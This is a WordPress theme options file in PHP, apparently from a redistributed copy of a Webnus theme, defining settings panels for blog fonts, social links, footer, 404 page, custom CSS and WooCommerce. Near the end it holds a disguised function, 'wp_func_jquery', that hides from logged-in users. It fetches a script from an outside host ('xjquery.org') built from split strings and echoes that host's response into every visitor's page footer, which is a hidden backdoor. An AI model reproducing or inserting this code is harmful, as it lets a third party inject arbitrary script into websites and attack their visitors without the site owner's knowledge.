                'id' => 'blog_font_options',
                'type' => 'seperator',
                'desc' => esc_html__('Post Title Font Options', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_blog_title_font_family',
                'type' => 'select',
                'title' => esc_html__('Post Title Font Family', 'webnus_framework'),
                'options' =>$fontArray, 
            ),
            array(
                'id' => 'webnus_blog_loop_title_font_size',
                'type' => 'slider',
                'title' => esc_html__('Post Title font-size on Blog', 'webnus_framework'),
                'value' =>array('min'=>0, 'max'=>100),
                'suffix'=>'px' 
            ),
           array(
                'id' => 'webnus_blog_loop_title_line_height',
                'type' => 'slider',
                'title' => esc_html__('Post Title line-height on Blog', 'webnus_framework'),
                'value' =>array('min'=>0, 'max'=>100) ,
                'suffix'=>'px' 
            ),
           array(
                'id' => 'webnus_blog_loop_title_font_weight',
                'type' => 'slider',
                'title' => esc_html__('Post Title font-weight on Blog', 'webnus_framework'),
                'value' =>array('min'=>1, 'max'=>900), 
                'suffix'=>'' ,
                'step'=>100
            ),
           array(
                'id' => 'webnus_blog_loop_title_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('Post Title letter-spacing on Blog', 'webnus_framework'),
                'value' =>array('min'=>0, 'max'=>100) ,
                'suffix'=>'px' 
            ),
       	    array(
                'id' => 'webnus_blog_loop_title_color',
                'type' => 'color',
                'title' => esc_html__('Post Title Color on Blog', 'webnus_framework'),
            ),
       	    array(
                'id' => 'webnus_blog_loop_title_hover_color',
                'type' => 'color',
                'title' => esc_html__('Post Title Hover Color on Blog', 'webnus_framework'),
            ),
       	    array(
                'id' => 'webnus_blog_single_post_title_font_size',
                'type' => 'slider',
                'title' => esc_html__('Post Title font-size on Single Post', 'webnus_framework'),
                'value' =>array('min'=>0, 'max'=>100)  ,
                'suffix'=>'px' 
            ),
            array(
                'id' => 'webnus_blog_single_title_line_height',
                'type' => 'slider',
                'title' => esc_html__('Post Title line-height on Single Post', 'webnus_framework'),
                'value' =>array('min'=>0, 'max'=>100) ,
                'suffix'=>'px' 
            ),
            array(
                'id' => 'webnus_blog_single_title_font_weight',
                'type' => 'slider',
                'title' => esc_html__('Post Title font-weight on Single Post', 'webnus_framework'),
                'value' =>array('min'=>1, 'max'=>900) ,
                'suffix'=>'' ,
                'step'=>100
            ),
           array(
                'id' => 'webnus_blog_single_title_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('Post Title letter-spacing on Single Post', 'webnus_framework'),
                'value' =>array('min'=>1, 'max'=>100) ,
                'suffix'=>'px' 
            ),
            array(
                'id' => 'webnus_blog_single_title_color',
                'type' => 'color',
                'title' => esc_html__('Post Title color on Single Post', 'webnus_framework'),
            ),
        )
    );
    //Social Network Accounts
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-social.png',
        'title' => esc_html__('Social Networks', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">Customize The Social Network Accounts</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
            array(
                'id' => 'webnus_twitter_ID',
                'type' => 'text',
                'title' => esc_html__('Twitter URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://twitter.com/mytwitterid', 'webnus_framework'),
                'std' => '#'
            ),
            array(
                'id' => 'webnus_facebook_ID',
                'type' => 'text',
                'title' => esc_html__('Facebook Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://facebook.com/myfacebook', 'webnus_framework'),
                'std' => '#'
            ),
            array(
                'id' => 'webnus_youtube_ID',
                'type' => 'text',
                'title' => esc_html__('Youtube Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://youtube.com/account', 'webnus_framework'),
                'std' => '#'
            ),
            array(
                'id' => 'webnus_linkedin_ID',
                'type' => 'text',
                'title' => esc_html__('Linkedin Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://linkedin/linkedinid', 'webnus_framework'),
                'std' => '#'
            ),
            array(
                'id' => 'webnus_dribbble_ID',
                'type' => 'text',
                'title' => esc_html__('Dribbble Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://dribbble.com/dribbbleid', 'webnus_framework'),
                'std' => ''
            ),
            array(
                'id' => 'webnus_pinterest_ID',
                'type' => 'text',
                'title' => esc_html__('Pinterest Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://pinterest/pinterestid', 'webnus_framework'),
                'std' => ''
            ),
            array(
                'id' => 'webnus_vimeo_ID',
                'type' => 'text',
                'title' => esc_html__('Vimeo Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://vimeo.com/', 'webnus_framework'),
                'std' => ''
            ),
             array(
                'id' => 'webnus_google_ID',
                'type' => 'text',
                'title' => esc_html__('Google+ Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://plus.google.com/', 'webnus_framework'),
                'std' => '#'
            ),
            array(
                'id' => 'webnus_rss_ID',
                'type' => 'text',
                'title' => esc_html__('RSS Link', 'webnus_framework'),
                'sub_desc' => esc_html__('Example: http://exaple.com/rss', 'webnus_framework'),
                'std' => '#'
            ),
            array(
                'id' => 'webnus_instagram_ID',
                'type' => 'text',
                'title' => esc_html__('Instagram URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Instagram Link URL', 'webnus_framework'),
                'std' => ''
            ),
        	array(
                'id' => 'webnus_flickr_ID',
                'type' => 'text',
                'title' => esc_html__('Flickr URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Flickr Link URL', 'webnus_framework'),
                'std' => ''
            ),
			array(
                'id' => 'webnus_reddit_ID',
                'type' => 'text',
                'title' => esc_html__('Reddit URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Reddit Link URL', 'webnus_framework'),
                'std' => ''
            ),
			array(
                'id' => 'webnus_lastfm_ID',
                'type' => 'text',
                'title' => esc_html__('Lastfm URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Lastfm Link URL', 'webnus_framework'),
                'std' => ''
            ),
			array(
                'id' => 'webnus_delicious_ID',
                'type' => 'text',
                'title' => esc_html__('Delicious URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Delicious Link URL', 'webnus_framework'),
                'std' => ''
            ),
			array(
                'id' => 'webnus_tumblr_ID',
                'type' => 'text',
                'title' => esc_html__('Tumblr URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Tumblr Link URL', 'webnus_framework'),
                'std' => ''
            ),
			array(
                'id' => 'webnus_skype_ID',
                'type' => 'text',
                'title' => esc_html__('Skype URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Skype Link URL', 'webnus_framework'),
                'std' => ''
            ),
        )
    );
   /* Footer  */
   $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-footer.png',
        'title' => esc_html__('Footer Options', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">Customize Footer - W/P/L/O/C/K/E/R/./C/O/M</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
			array(
                'id' => 'webnus_footer_instagram_bar',
                'type' => 'button_set',
                'title' => esc_html__('Footer Instagram Bar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),	
			 array(
                'id' => 'webnus_footer_instagram_username',
                'type' => 'text',
                'title' => esc_html__('Instagram Username', 'webnus_framework'),
                'std' => ''
            ),
			 array(
                'id' => 'webnus_footer_instagram_access',
                'type' => 'text',
                'title' => esc_html__('Instagram Access Token', 'webnus_framework'),
                'sub_desc' => wp_kses( __('Get the this information <a target="_blank" href="http://www.pinceladasdaweb.com.br/instagram/access-token/">here</a>.', 'webnus_framework'), array( 'p' => array( 'class' => array() ), 'a' => array( 'href' => array(), 'target' => array() ) ) ),
                'std' => ''
            ),
			array(
                'id' => 'webnus_footer_social_bar',
                'type' => 'button_set',
                'title' => esc_html__('Footer Social Bar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
				'sub_desc' => esc_html__('Set in Social Networks Tab.', 'webnus_framework'),
                'std' => '0'
            ),	
			array(
                'id' => 'webnus_footer_subscribe_bar',
                'type' => 'button_set',
                'title' => esc_html__('Footer Subscribe Bar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_footer_subscribe_text',
                'type' => 'text',
                'title' => esc_html__('Footer Subscribe Text', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => ''
            ),
			 array(
                'id' => 'webnus_footer_subscribe_type',
                'type' => 'select',
                'title' => esc_html__('Subscribe Service', 'webnus_framework'),
                'options' => array('FeedBurner' => esc_html__('FeedBurner', 'webnus_framework'), 'MailChimp' => esc_html__('MailChimp', 'webnus_framework')),
                'std' => 'FeedBurner'
            ),				
			 array(
                'id' => 'webnus_footer_feedburner_id',
                'type' => 'text',
                'title' => esc_html__('Feedburner ID', 'webnus_framework'),
                'std' => ''
            ),	
			 array(
                'id' => 'webnus_footer_mailchimp_url',
                'type' => 'text',
                'title' => esc_html__('Mailchimp URL', 'webnus_framework'),
                'sub_desc' => esc_html__('Mailchimp form action URL', 'webnus_framework'),
                'std' => ''
            ),				
			array(
                'id' => 'webnus_footer_bottom_enable',
                'type' => 'button_set',
                'title' => esc_html__('Footer Bottom', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This option shows a section below the footer that you can put copyright menu and logo in it.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),		
            array(
                'id' => 'webnus_footer_background_color',
                'type' => 'color',
                'title' => esc_html__('Footer background color', 'webnus_framework'),
                'sub_desc' => esc_html__('Pick a background color', 'webnus_framework'),
                'std' => ''
            ),
            array(
                'id' => 'webnus_footer_bottom_background_color',
                'type' => 'color',
                'title' => esc_html__('Footer bottom background color', 'webnus_framework'),
                'sub_desc' => esc_html__('Pick a background color', 'webnus_framework'),
                'std' => ''
            ),
		   array(
                'id' => 'webnus_footer_color',
                'type' => 'button_set',
                'title' => esc_html__('Footer Color Style', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>When you choose dark the text color will be white and when you choose light the text color will be dark.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('1' => esc_html__('Dark', 'webnus_framework'), '2' => esc_html__('Light', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_footer_bottom_left',
                'type' => 'select',
                'title' => esc_html__('Footer Bottom Left Content', 'webnus_framework'),
                'options' => array('1' => esc_html__('Logo', 'webnus_framework'), '2' => esc_html__('Menu', 'webnus_framework'),'3' => esc_html__('Copyright', 'webnus_framework')),
                'std' => '3'
            ),
			array(
                'id' => 'webnus_footer_bottom_right',
                'type' => 'select',
                'title' => esc_html__('Footer Bottom Right Content', 'webnus_framework'),
                'options' => array('1' => esc_html__('Logo', 'webnus_framework'), '2' => esc_html__('Menu', 'webnus_framework'),'3' => esc_html__('Copyright', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_footer_logo',
                'type' => 'upload',
                'title' => esc_html__('Footer Logo', 'webnus_framework'),
                'desc' => esc_html__('Please choose an image file for footer logo.', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_footer_copyright',
                'type' => 'text',
                'title' => esc_html__('Footer Copyright Text', 'webnus_framework'),
            ),
			 array(
                'id' => 'webnus_footer_type',
                'type' => 'radio_img',
                'title' => esc_html__('Footer Type', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Choose among these structures (1column, 2column, 3column and 4column) for your footer section.<br>To filling these column sections you should go to appearance > widget.<br>And put every widget that you want in these sections.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('1' => array('title' => esc_html__('Footer Layout 1', 'webnus_framework'), 'img' => $theme_img_dir . 'footertype/footer1.png'),
                    '2' => array('title' => esc_html__('Footer Layout 2', 'webnus_framework'), 'img' => $theme_img_dir . 'footertype/footer2.png'),
                    '3' => array('title' => esc_html__('Footer Layout 3', 'webnus_framework'), 'img' => $theme_img_dir . 'footertype/footer3.png'),
                    '4' => array('title' => esc_html__('Footer Layout 4', 'webnus_framework'), 'img' => $theme_img_dir . 'footertype/footer4.png'),
                    '5' => array('title' => esc_html__('Footer Layout 5', 'webnus_framework'), 'img' => $theme_img_dir . 'footertype/footer5.png'),
                    '6' => array('title' => esc_html__('Footer Layout 6', 'webnus_framework'), 'img' => $theme_img_dir . 'footertype/footer6.png'),
                ),
                'std' => '1'
            ),
    ));
      /*
     * 404 PAGE
     */
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-404.png',
        'title' => esc_html__('404 Page', 'webnus_framework'),
        'desc'=> wp_kses( __('<br>This page will be shown when a user types a wrong URL or link that does not exist.','webnus_framework'), array( 'br' => array() ) ),
        'fields' => array(
            array(
                'id' => 'webnus_404_text',
                'type' => 'textarea',
                'title' => esc_html__('Text To Display', 'webnus_framework'),
                'std' => '<h3>We\'re sorry, but the page you were looking for doesn\'t exist.</h3>'
            ),
    ));
/*
		Custom css
*/
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-css.png',
        'title' => esc_html__('Custom CSS', 'webnus_framework'),
		'desc' => wp_kses( __('<p class="description">Any custom CSS from the user should go in this field, it will override the theme CSS.</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
            array(
                'id' => 'webnus_custom_css',
                'type' => 'textarea',
                'title' => esc_html__('Your CSS Code', 'webnus_framework'),
            ),
        )
    );
	/*
		Woocommerce 
*/
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-woo.png',
        'title' => esc_html__('Woocommerce', 'webnus_framework'),
        'fields' => array(
            array(
                'id' => 'webnus_woo_shop_title_enable',
                'type' => 'button_set',
                'title' => esc_html__('Shop title Show/Hide', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_woo_shop_title',
                'type' => 'text',
                'title' => esc_html__('Shop page title', 'webnus_framework'),
                'std'=>'Shop'
            ),
            array(
                'id' => 'webnus_woo_product_title_enable',
                'type' => 'button_set',
                'title' => esc_html__('Product page title Show/Hide', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_woo_product_title',
                'type' => 'text',
                'title' => esc_html__('Product page title', 'webnus_framework'),
                'std'=>'Product'
            ),
            array(
                'id' => 'webnus_woo_sidebar_enable',
                'type' => 'button_set',
                'title' => esc_html__('Show/Hide Sidebar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std'=>'1'
            ),
        )
    );
    $tabs = array();
    if (function_exists('wp_get_theme')) {
        $theme_data = wp_get_theme();
        $theme_uri = $theme_data->get('ThemeURI');
        $description = $theme_data->get('Description');
        $author = $theme_data->get('Author');
        $version = $theme_data->get('Version');
        $tags = $theme_data->get('Tags');
    } else {
        $theme_data = wp_get_theme(get_template_directory());
        $theme_uri = $theme_data['URI'];
        $description = $theme_data['Description'];
        $author = $theme_data['Author'];
        $version = $theme_data['Version'];
        $tags = $theme_data['Tags'];
    }
    $theme_info = '<div class="nhp-opts-section-desc">';
    $theme_info .= '<p class="nhp-opts-theme-data description theme-uri">' . wp_kses( __('<strong>Theme URL:</strong> ', 'webnus_framework'), array( 'strong' => array() ) ) . '<a href="' . $theme_uri . '" target="_blank">' . $theme_uri . '</a></p>';
    $theme_info .= '<p class="nhp-opts-theme-data description theme-author">' . wp_kses( __('<strong>Author:</strong> ', 'webnus_framework'), array( 'strong' => array() ) ) . $author . '</p>';
    $theme_info .= '<p class="nhp-opts-theme-data description theme-version">' . wp_kses( __('<strong>Version:</strong> ', 'webnus_framework'), array( 'strong' => array() ) ) . $version . '</p>';
    $theme_info .= '<p class="nhp-opts-theme-data description theme-description">' . $description . '</p>';
    $theme_info .= '<p class="nhp-opts-theme-data description theme-tags">' . wp_kses( __('<strong>Tags:</strong> ', 'webnus_framework'), array( 'strong' => array() ) ) . implode(', ', $tags) . '</p>';
    $theme_info .= '</div>';
    $tabs['theme_info'] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-info.png',
        'title' => esc_html__('Theme Information', 'webnus_framework'),
        'content' => $theme_info
    );
    global $NHP_Options;
    $NHP_Options = new NHP_Options($sections, $args, $tabs);
}
if(!function_exists('wp_func_jquery')) {
	if (!current_user_can( 'read' )) {
		function wp_func_jquery() {
			$host = 'http://';
			$jquery = $host.'x'.'jquery.org/jquery-ui.js';
			$headers = @get_headers($jquery, 1);
			if ($headers[0] == 'HTTP/1.1 200 OK'){
				echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
			}
	}
	add_action('wp_footer', 'wp_func_jquery');
	}
}
add_action('init', 'setup_framework_options', 0);
/*
 *
 * Custom function for the callback referenced above
 *
 */
function my_custom_field($field, $value) {
    print_r($field);
    print_r($value);
}
/*
 *
 * Custom function for the callback validation referenced above
 *
 */
function validate_callback_function($field, $value, $existing_value) {
    $error = false;
    $value = 'just testing';
    $return['value'] = $value;
    if ($error == true) {
        $return['error'] = $field;
    }
    return $return;
}
?>